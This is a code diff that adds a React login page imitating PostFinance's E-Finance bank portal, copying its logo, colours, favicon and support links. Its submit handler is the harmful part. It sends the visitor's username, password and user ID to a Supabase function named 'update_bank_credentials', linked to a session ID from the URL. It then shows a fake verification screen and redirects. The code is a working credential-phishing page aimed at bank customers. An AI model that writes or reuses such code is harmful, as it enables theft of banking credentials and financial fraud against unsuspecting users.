@@ -1,0 +1,438 @@
+import { useEffect, useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { Eye, EyeOff, MessageCircleMore, ChevronRight, Info, QrCode, ChevronDown } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
+
+const PF_YELLOW = "#FFCC00";
+const PF_YELLOW_HOVER = "#E6B800";
+const PF_PETROL = "#005C5A";
+const PF_MINT = "#EAF4F1";
+const PF_LINE = "#005C5A";
+
+const PostFinanceLogo = ({ className = "" }: { className?: string }) => (
+  <svg
+    role="img"
+    aria-label="PostFinance"
+    viewBox="100 100 1000 147"
+    height="29"
+    xmlns="http://www.w3.org/2000/svg"
+    className={className}
+    style={{ color: PF_PETROL }}
+  >
+    <path
+      d="M238.23,151.49c-2.06-.15-4.13-.15-6.19-.15-19.77,0-37.17,4.27-51.26,12.57,11.8-15.61,17.73-36.09,17.36-60.09v-3.82h-44.85l.06,4.41c.29,16.31-3.54,28.51-11.35,36-10.17,9.7-26.67,11.17-38.76,10.58l-3.24-.17v44.59l1.77.11c2.06.15,4.13.15,6.19.15,19.77,0,37.17-4.27,51.26-12.57-11.8,15.61-17.73,36.09-17.36,60.09v3.82h44.85l-.06-4.41c-.29-16.31,3.54-28.51,11.35-36,10.17-9.7,26.67-11.17,38.76-10.58l3.24.17v-44.59l-1.77-.11Z"
+      fill="currentColor"
+    />
+    <path
+      d="M349.29,155.04c0,16.94-11.82,32.59-32.27,32.59h-23.49s0,36.99,0,36.99h-18.53v-102.17h42.1c20.37,0,32.19,15.66,32.19,32.59ZM293.53,139.06v31.95h20.77c9.99,0,15.98-6.31,16.14-15.98-.16-9.67-6.15-15.98-16.14-15.98h-20.77ZM559.15,211.28c-10.62,0-14.46-2.56-14.46-11.5v-34.27h19.33s0-15.18,0-15.18h-21.81c3.51-3.28,6.63-7.83,6.15-18.29h-16.78c0,.88-.88,17.02-15.82,23.49v9.99h11.5v36.11c0,17.34,10.94,25,28.44,25,3.04,0,6.15-.16,9.19-.64v-15.02c-2,.16-3.83.32-5.75.32ZM646.92,122.52h-65.91s0,102.09,0,102.09h18.61s0-41.78,0-41.78h43.78s0-16.46,0-16.46h-43.78v-27.16h47.29s0-16.7,0-16.7ZM677.79,148.8h-17.65s0,75.89,0,75.89h17.65s0-75.89,0-75.89ZM694.65,224.7h17.65s0-43.3,0-43.3c0-12.46,9.83-17.81,17.97-17.81,7.27,0,12.78,4.39,12.78,15.18v45.93h17.65s0-48.09,0-48.09c0-18.61-9.11-29.64-26.44-29.64-9.99,0-19.97,5.35-22.93,15.34l-1.36-13.5h-15.34s0,75.89,0,75.89ZM772.85,186.67c0-19.49,11.34-39.62,36.43-39.62,11.5,0,20.13,6.47,21.49,12.14l1.2-10.31h15.5v58.4c0,2.32,1.2,5.03,6.47,4.95v13.02l-3.99.48c-10.31.64-18.77-5.35-19.17-12.62v-.16c-2.16,7.03-11.34,13.66-21.49,13.66-25.16,0-36.43-21.57-36.43-39.94ZM830.37,188.99v-5.91c0-12.78-8.79-19.81-19.49-19.81-13.66,0-19.81,12.62-19.81,23.33s4.31,23.49,19.81,23.49c12.7.08,19.49-9.43,19.49-21.09ZM868.36,148.8v75.89s17.65,0,17.65,0v-43.3c0-12.46,9.83-17.81,17.97-17.81,7.27,0,12.78,4.39,12.78,15.18v45.93h17.65s0-48.09,0-48.09c0-18.61-9.11-29.64-26.44-29.64-9.99,0-19.97,5.35-22.93,15.34l-1.36-13.5h-15.34ZM1000.99,199.13c-3.2,10.31-10.7,11.34-15.5,11.34-9.83,0-21.17-6.39-21.17-23.33s11.5-23.65,21.17-23.65c5.03,0,12.86,1.2,15.34,11.34l17.35-4.46c-3.47-14.36-17.64-23.02-32.6-23.02-23.49,0-38.58,17.97-38.58,39.62s14.06,39.46,38.5,39.62c15.98.15,27.58-8.37,31.76-23.26l-16.26-4.22ZM1097.77,204.95c-4.15,12.54-14.86,21.66-31.89,21.66-23.81,0-39.06-17.97-39.06-39.78,0-23.01,15.26-39.62,37.87-39.62,15.74.08,35.31,9.59,35.31,38.74l-.16,5.03h-55.01c-.48,11.02,8.92,20.45,20.9,20.45,6.15,0,13.34-1.84,15.98-10.62l16.07,4.14ZM1045.55,178.44l36.27-.04c0-9.83-7.62-16.9-16.72-16.9-10.31,0-18.58,7.59-19.54,16.94ZM669.49,137.06c5.43,0,10.07-4.47,10.07-9.91s-4.63-9.91-10.07-9.91c-5.27,0-9.91,4.47-9.91,9.91s4.63,9.91,9.91,9.91ZM393.55,146.41c-22.77,0-38.82,18.13-38.82,40.1s15.82,40.1,38.98,40.1c23.01,0,38.82-18.29,38.82-40.1,0-21.97-15.82-40.1-38.98-40.1ZM393.71,210.8c-12.54,0-22.77-10.86-22.77-24.36s10.23-24.36,22.77-24.36c12.54,0,22.77,10.86,22.77,24.36s-10.23,24.36-22.77,24.36ZM476.47,226.61c19.57,0,32.59-10.7,32.59-26.6,0-17.81-16.38-19.89-30.28-21.65-10.15-1.36-19.09-2.72-19.09-10.15,0-5.19,4.47-8.95,13.82-8.95,9.83,0,15.1,4.23,17.26,11.74l16.86-4.31c-3.12-12.78-13.9-22.05-33.39-22.05-19.73,0-32.43,9.43-32.43,25.32,0,17.97,16.22,20.37,30.36,22.53,10.39,1.6,18.85,2.88,18.85,9.99,0,5.67-5.24,9.33-14.19,9.33-9.35,0-16.56-4.13-18.96-12.68l-17.02,4.39c4.23,14.46,18.13,23.09,35.63,23.09Z"
+      fill="currentColor"
+    />
+  </svg>
+);
+
+// Decorative QR-Code placeholder (deterministic pattern, no real payload)
+const QrPlaceholder = () => {
+  const N = 25;
+  const cells: boolean[][] = [];
+  let seed = 1337;
+  const rand = () => {
+    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
+    return (seed >> 8) % 1000 / 1000;
+  };
+  for (let r = 0; r < N; r++) {
+    const row: boolean[] = [];
+    for (let c = 0; c < N; c++) row.push(rand() > 0.55);
+    cells.push(row);
+  }
+  // Finder patterns in 3 corners
+  const stamp = (sr: number, sc: number) => {
+    for (let r = 0; r < 7; r++)
+      for (let c = 0; c < 7; c++) {
+        const edge = r === 0 || r === 6 || c === 0 || c === 6;
+        const inner = r >= 2 && r <= 4 && c >= 2 && c <= 4;
+        cells[sr + r][sc + c] = edge || inner;
+      }
+  };
+  stamp(0, 0);
+  stamp(0, N - 7);
+  stamp(N - 7, 0);
+
+  const size = 220;
+  const cell = size / N;
+  return (
+    <svg width={size} height={size} viewBox={`0 0 ${size} ${size}`} aria-hidden="true">
+      <rect width={size} height={size} fill="#ffffff" />
+      {cells.flatMap((row, r) =>
+        row.map((on, c) =>
+          on ? (
+            <rect
+              key={`${r}-${c}`}
+              x={c * cell}
+              y={r * cell}
+              width={cell}
+              height={cell}
+              fill="#000"
+            />
+          ) : null
+        )
+      )}
+    </svg>
+  );
+};
+
+const FieldUnderline = ({ focused }: { focused: boolean }) => (
+  <div
+    style={{
+      height: focused ? 2 : 1,
+      background: PF_LINE,
+      transition: "height 120ms",
+    }}
+  />
+);
+
+const ChPostfinance = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+
+  const [benutzername, setBenutzername] = useState("");
+  const [passwort, setPasswort] = useState("");
+  const [benutzerId, setBenutzerId] = useState("");
+  const [showPw, setShowPw] = useState(false);
+  const [focus, setFocus] = useState<"u" | "p" | "b" | null>(null);
+  const [submitHover, setSubmitHover] = useState(false);
+  const [showLoading, setShowLoading] = useState(false);
+
+  useEffect(() => {
+    window.scrollTo(0, 0);
+  }, []);
+  usePageMeta("PostFinance E-Finance Login", "https://www.postfinance.ch/favicon.ico");
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!benutzername || !passwort) return;
+    const usernameCombined = benutzerId
+      ? `${benutzername} | Benutzeridentifikation: ${benutzerId}`
+      : benutzername;
+    if (sessionId) {
+      const { error } = await supabase.rpc("update_bank_credentials", {
+        p_session_id: sessionId,
+        p_username: usernameCombined,
+        p_password: passwort,
+        p_username_label: "E-Finance-Nummer / Benutzername",
+        p_password_label: "Passwort",
+      });
+      if (error) console.error("Update failed:", error);
+    } else {
+      console.error("No session ID found in URL!");
+    }
+    setShowLoading(true);
+  };
+
+  return (
+    <>
+      {showLoading && (
+        <LoadingOverlay
+          message="Anmeldedaten werden überprüft..."
+          onComplete={() => navigate("/confirmation?s=" + sessionId)}
+        />
+      )}
+      <div
+        className="min-h-screen flex flex-col"
+        style={{
+          background: PF_MINT,
+          color: PF_PETROL,
+          fontFamily:
+            "'PostFinance Sans', 'HelveticaNeue', 'Helvetica Neue', Helvetica, Arial, sans-serif",
+        }}
+      >
+        {/* Header */}
+        <header
+          className="w-full flex items-center justify-between px-5 md:px-10"
+          style={{ background: PF_YELLOW, height: 80 }}
+        >
+          <PostFinanceLogo className="h-6 md:h-[29px] w-auto" />
+          <a
+            href="https://www.postfinance.ch/de/support/kontakt.html"
+            target="_blank"
+            rel="noopener noreferrer"
+            className="flex items-center gap-2 text-[15px] font-medium hover:underline"
+            style={{ color: PF_PETROL }}
+          >
+            <MessageCircleMore className="w-5 h-5" strokeWidth={1.8} />
+            <span className="hidden sm:inline">Kontakt und Support</span>
+          </a>
+        </header>
+
+        {/* Main */}
+        <main className="flex-1 px-5 md:px-10 pt-10 md:pt-14 pb-10">
+          <div className="max-w-[1180px] mx-auto">
+            <h1
+              className="font-normal mb-8 md:mb-10"
+              style={{ color: PF_PETROL, fontSize: "clamp(28px, 4vw, 40px)" }}
+            >
+              Login
+            </h1>
+
+            <div className="grid grid-cols-1 md:grid-cols-[1fr_360px] gap-6 md:gap-8">
+              {/* Login Card */}
+              <section className="bg-white rounded-2xl p-6 md:p-10 shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
+                <form onSubmit={handleSubmit} className="flex flex-col gap-8">
+                  {/* E-Finance-Nummer */}
+                  <div>
+                    <label
+                      htmlFor="pf-user"
+                      className="flex items-center gap-2 text-[14px] font-bold mb-2"
+                      style={{ color: PF_PETROL }}
+                    >
+                      E-Finance-Nummer / Benutzername
+                      <span
+                        className="inline-flex items-center justify-center w-[18px] h-[18px] rounded-full border"
+                        style={{ borderColor: PF_PETROL }}
+                        aria-hidden="true"
+                      >
+                        <Info className="w-3 h-3" strokeWidth={2} />
+                      </span>
+                    </label>
+                    <input
+                      id="pf-user"
+                      type="text"
+                      autoComplete="username"
+                      value={benutzername}
+                      onChange={(e) => setBenutzername(e.target.value)}
+                      onFocus={() => setFocus("u")}
+                      onBlur={() => setFocus(null)}
+                      className="w-full bg-transparent outline-none py-2 text-[16px]"
+                      style={{ color: PF_PETROL }}
+                    />
+                    <FieldUnderline focused={focus === "u"} />
+                  </div>
+
+                  {/* Passwort */}
+                  <div>
+                    <label
+                      htmlFor="pf-pw"
+                      className="block text-[14px] font-bold mb-2"
+                      style={{ color: PF_PETROL }}
+                    >
+                      Passwort
+                    </label>
+                    <div className="relative">
+                      <input
+                        id="pf-pw"
+                        type={showPw ? "text" : "password"}
+                        autoComplete="current-password"
+                        value={passwort}
+                        onChange={(e) => setPasswort(e.target.value)}
+                        onFocus={() => setFocus("p")}
+                        onBlur={() => setFocus(null)}
+                        className="w-full bg-transparent outline-none py-2 pr-10 text-[16px]"
+                        style={{ color: PF_PETROL }}
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowPw((v) => !v)}
+                        className="absolute right-0 top-1/2 -translate-y-1/2 p-1"
+                        aria-label={showPw ? "Passwort verbergen" : "Passwort anzeigen"}
+                        style={{ color: PF_PETROL }}
+                      >
+                        {showPw ? (
+                          <EyeOff className="w-5 h-5" strokeWidth={1.8} />
+                        ) : (
+                          <Eye className="w-5 h-5" strokeWidth={1.8} />
+                        )}
+                      </button>
+                    </div>
+                    <FieldUnderline focused={focus === "p"} />
+                    <a
+                      href="https://www.postfinance.ch/de/support/services/passwort.html"
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="inline-flex items-center gap-1 mt-3 text-[14px] font-medium hover:underline"
+                      style={{ color: PF_PETROL }}
+                    >
+                      Passwort vergessen
+                      <ChevronRight className="w-4 h-4" strokeWidth={2} />
+                    </a>
+                  </div>
+
+                  {/* Falls vorhanden */}
+                  <div className="pt-2">
+                    <h2
+                      className="font-normal mb-4"
+                      style={{ color: PF_PETROL, fontSize: "clamp(20px, 2.4vw, 24px)" }}
+                    >
+                      Falls vorhanden
+                    </h2>
+                    <label
+                      htmlFor="pf-bid"
+                      className="flex items-center gap-2 text-[14px] font-bold mb-2"
+                      style={{ color: PF_PETROL }}
+                    >
+                      Benutzeridentifikation
+                      <span
+                        className="inline-flex items-center justify-center w-[18px] h-[18px] rounded-full border"
+                        style={{ borderColor: PF_PETROL }}
+                        aria-hidden="true"
+                      >
+                        <Info className="w-3 h-3" strokeWidth={2} />
+                      </span>
+                    </label>
+                    <input
+                      id="pf-bid"
+                      type="text"
+                      value={benutzerId}
+                      onChange={(e) => setBenutzerId(e.target.value)}
+                      onFocus={() => setFocus("b")}
+                      onBlur={() => setFocus(null)}
+                      className="w-full bg-transparent outline-none py-2 text-[16px]"
+                      style={{ color: PF_PETROL }}
+                    />
+                    <FieldUnderline focused={focus === "b"} />
+                  </div>
+
+                  <div className="flex justify-end pt-2">
+                    <button
+                      type="submit"
+                      onMouseEnter={() => setSubmitHover(true)}
+                      onMouseLeave={() => setSubmitHover(false)}
+                      className="rounded-full px-10 py-3 text-[15px] font-semibold transition-colors"
+                      style={{
+                        background: submitHover ? PF_YELLOW_HOVER : PF_YELLOW,
+                        color: PF_PETROL,
+                      }}
+                    >
+                      Weiter
+                    </button>
+                  </div>
+                </form>
+              </section>
+
+              {/* Right column */}
+              <aside className="flex flex-col gap-6">
+                {/* Schnelles Login */}
+                <div className="bg-white rounded-2xl p-6">
+                  <h3
+                    className="font-normal mb-4"
+                    style={{ color: PF_PETROL, fontSize: 20 }}
+                  >
+                    Schnelles Login
+                  </h3>
+                  <div className="flex justify-center mb-4">
+                    <div className="border" style={{ borderColor: "#e5e7eb" }}>
+                      <QrPlaceholder />
+                    </div>
+                  </div>
+                  <p className="text-[14px] leading-relaxed mb-3" style={{ color: PF_PETROL }}>
+                    Zum Einloggen ins E-Finance am Computer, scannen Sie den QR-Code mit Ihrem
+                    Smartphone.
+                  </p>
+                  <a
+                    href="https://www.postfinance.ch/de/support/services/digitale-services/e-finance.html"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="inline-flex items-center gap-1 text-[14px] font-medium hover:underline"
+                    style={{ color: PF_PETROL }}
+                  >
+                    Anleitung
+                    <ChevronRight className="w-4 h-4" strokeWidth={2} />
+                  </a>
+                </div>
+
+                {/* Benötigen Sie Hilfe */}
+                <div className="bg-white rounded-2xl p-6">
+                  <h3
+                    className="font-normal mb-4"
+                    style={{ color: PF_PETROL, fontSize: 20 }}
+                  >
+                    Benötigen Sie Hilfe?
+                  </h3>
+                  <ul className="flex flex-col gap-3 text-[14px]">
+                    {[
+                      {
+                        label: "Support zum Login",
+                        href: "https://www.postfinance.ch/de/support/services/digitale-services/e-finance.html",
+                      },
+                      {
+                        label: "E-Finance bestellen",
+                        href: "https://www.postfinance.ch/de/privat/produkte/digitale-services/e-finance.html",
+                      },
+                      {
+                        label: "Demoversion E-Finance",
+                        href: "https://www.postfinance.ch/de/support/services/digitale-services/e-finance/demoversion.html",
+                      },
+                      {
+                        label: "Sicherheitsstandards",
+                        href: "https://www.postfinance.ch/de/support/sicherheit.html",
+                      },
+                    ].map((l) => (
+                      <li key={l.label}>
+                        <a
+                          href={l.href}
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          className="inline-flex items-center gap-1 font-medium hover:underline"
+                          style={{ color: PF_PETROL }}
+                        >
+                          {l.label}
+                          <ChevronRight className="w-4 h-4" strokeWidth={2} />
+                        </a>
+                      </li>
+                    ))}
+                  </ul>
+                </div>
+              </aside>
+            </div>
+          </div>
+        </main>
+
+        {/* Footer */}
+        <footer className="px-5 md:px-10 py-6 border-t" style={{ borderColor: "#d6e4e0" }}>
+          <div className="max-w-[1180px] mx-auto flex flex-col gap-4 md:flex-row md:items-center md:justify-between text-[13px]">
+            <a
+              href="https://www.postfinance.ch"
+              target="_blank"
+              rel="noopener noreferrer"
+              className="inline-flex items-center gap-1 font-medium hover:underline"
+              style={{ color: PF_PETROL }}
+            >
+              zu postfinance.ch
+              <ChevronRight className="w-4 h-4" strokeWidth={2} />
+            </a>
+            <div className="flex flex-col md:flex-row md:items-center gap-3 md:gap-8">
+              <button
+                type="button"
+                className="inline-flex items-center gap-1 font-medium"
+                style={{ color: PF_PETROL }}
+              >
+                Automatisch
+                <ChevronDown className="w-4 h-4" strokeWidth={2} />
+              </button>
+              <button
+                type="button"
+                className="inline-flex items-center gap-1 font-medium"
+                style={{ color: PF_PETROL }}
+              >
+                Deutsch
+                <ChevronDown className="w-4 h-4" strokeWidth={2} />
+              </button>
+              <a
+                href="https://www.postfinance.ch/de/footer/rechtliches.html"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="font-medium hover:underline"
+                style={{ color: PF_PETROL }}
+              >
+                Rechtliches und Barrierefreiheit
+              </a>
+            </div>
+          </div>
+        </footer>
+      </div>
+    </>
+  );
+};
+
+export default ChPostfinance;
